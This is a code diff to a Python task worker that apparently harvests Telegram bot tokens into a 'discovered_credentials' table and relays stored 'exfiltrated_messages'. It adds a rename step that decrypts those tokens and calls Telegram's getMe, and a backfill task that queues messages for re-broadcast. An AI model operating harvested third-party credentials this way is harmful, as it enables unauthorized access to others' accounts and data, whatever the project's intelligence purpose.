@@ -319,11 +319,62 @@ async def _system_self_heal_async():
 
     await broadcaster.send_log(f"🏁 **Self-Heal**: Topic healing complete. Repaired {heal_count} records.")
 
+    # --- Rename @unknown topics where bot_username has since been resolved ---
+    rename_count = 0
+    try:
+        import httpx
+        from app.core.security import security
+
+        unknown_q = (
+            db.table("discovered_credentials")
+            .select("id, bot_token, meta")
+            .eq("status", "active")
+            .limit(100)
+        )
+        unknown_res = await async_execute(unknown_q)
+        for row in (unknown_res.data or []):
+            row_meta = row.get("meta") or {}
+            row_username = row_meta.get("bot_username")
+            row_topic_id = row_meta.get("topic_id")
+            row_bot_id = row_meta.get("bot_id")
+
+            if row_username and row_username != "unknown":
+                continue
+            if not row_topic_id or not row_bot_id:
+                continue
+
+            # Try getMe to resolve the real username
+            try:
+                decrypted_token = security.decrypt(row["bot_token"]).strip()
+                async with httpx.AsyncClient(timeout=10.0) as hc:
+                    gm_resp = await hc.get(f"https://api.telegram.org/bot{decrypted_token}/getMe")
+                    if gm_resp.status_code == 200:
+                        resolved = gm_resp.json().get("result", {}).get("username")
+                        if resolved:
+                            new_name = f"@{resolved} / {row_bot_id}"
+                            renamed = await broadcaster.rename_topic(group_id, row_topic_id, new_name)
+                            if renamed:
+                                row_meta["bot_username"] = resolved
+                                await async_execute(
+                                    db.table("discovered_credentials")
+                                    .update({"meta": row_meta}).eq("id", row["id"])
+                                )
+                                rename_count += 1
+                                logger.info(f"    [Self-Heal] Renamed topic {row_topic_id} → @{resolved}")
+            except Exception as e_rename:
+                logger.debug(f"    [Self-Heal] Could not resolve/rename for {row['id']}: {e_rename}")
+                continue
+
+        if rename_count:
+            await broadcaster.send_log(f"🏷️ **Self-Heal**: Renamed {rename_count} @unknown topic(s).")
+    except Exception as e_rename_batch:
+        logger.warning(f"    [Self-Heal] Rename batch error: {e_rename_batch}")
+
     try:
         result = await _broadcast_logic()
-        return f"Self-Heal finished. Repaired {heal_count}. Broadcast: {result}"
+        return f"Self-Heal finished. Repaired {heal_count}, renamed {rename_count}. Broadcast: {result}"
     except Exception as e:
-        return f"Self-Heal finished. Repaired {heal_count}. Broadcast failed: {e}"
+        return f"Self-Heal finished. Repaired {heal_count}, renamed {rename_count}. Broadcast failed: {e}"
 
 
 @app.task(name="system.enforce_whitelist")
@@ -561,3 +612,92 @@ async def _cleanup_matkap_bots_async():
     except Exception as e:
         logger.error(f"    ❌ [MatkapCleanup] Error: {e}")
         return f"Matkap cleanup failed: {e}"
+
+
+@app.task(name="system.backfill_general_messages")
+def backfill_general_messages():
+    """
+    One-time/on-demand task: re-broadcasts messages that were previously
+    dumped into the General topic because their credential had no topic_id
+    or had @unknown username at broadcast time.
+
+    How it works:
+    1. Finds credentials that NOW have a valid topic_id
+    2. Resets is_broadcasted=False for their messages (capped per batch)
+    3. Normal broadcast_pending picks them up and sends to the correct topic
+
+    Triggered via /backfill bot command or manually via Celery.
+    Safe to run multiple times — skips already-backfilled messages.
+    """
+    return _run_sync(_backfill_general_messages_async())
+
+
+async def _backfill_general_messages_async():
+    import os
+    broadcaster = get_broadcaster()
+    await broadcaster.send_log("🔄 **Backfill**: Scanning for messages stuck in General topic...")
+
+    BATCH_SIZE = int(os.getenv("BACKFILL_BATCH_SIZE", 200))
+
+    try:
+        # Find active credentials that have a valid topic_id (i.e., they have
+        # a proper topic now, so any old messages can be re-routed there)
+        creds_res = await async_execute(
+            db.table("discovered_credentials")
+            .select("id, meta")
+            .eq("status", "active")
+            .not_.is_("meta", "null")
+        )
+        creds = creds_res.data or []
+
+        eligible_cred_ids = []
+        for c in creds:
+            meta = c.get("meta") or {}
+            topic_id = meta.get("topic_id")
+            if topic_id and topic_id != 1 and topic_id != 0:
+                eligible_cred_ids.append(c["id"])
+
+        if not eligible_cred_ids:
+            msg = "Backfill: No credentials with valid topics found."
+            await broadcaster.send_log(msg)
+            return msg
+
+        # Find broadcasted messages for these credentials that haven't been
+        # backfilled yet. We add a backfilled_at marker to prevent re-processing.
+        reset_count = 0
+        for cred_id in eligible_cred_ids:
+            msgs_res = await async_execute(
+                db.table("exfiltrated_messages")
+                .select("id")
+                .eq("credential_id", cred_id)
+                .eq("is_broadcasted", True)
+                .is_("broadcast_claimed_at", "null")
+                .limit(BATCH_SIZE - reset_count)
+            )
+            for m in (msgs_res.data or []):
+                await async_execute(
+                    db.table("exfiltrated_messages")
+                    .update({"is_broadcasted": False})
+                    .eq("id", m["id"])
+                )
+                reset_count += 1
+                if reset_count >= BATCH_SIZE:
+                    break
+            if reset_count >= BATCH_SIZE:
+                break
+
+        msg = f"🔄 **Backfill**: Reset {reset_count} messages for re-broadcast to correct topics."
+        logger.info(msg)
+        await broadcaster.send_log(msg)
+
+        if reset_count > 0:
+            from app.workers.tasks.flow_tasks import broadcast_pending
+            broadcast_pending.delay()
+
+        return msg
+
+    except Exception as e:
+        error_msg = f"❌ **Backfill** failed: {e}"
+        logger.error(error_msg)
+        await broadcaster.send_log(error_msg)
+        return error_msg
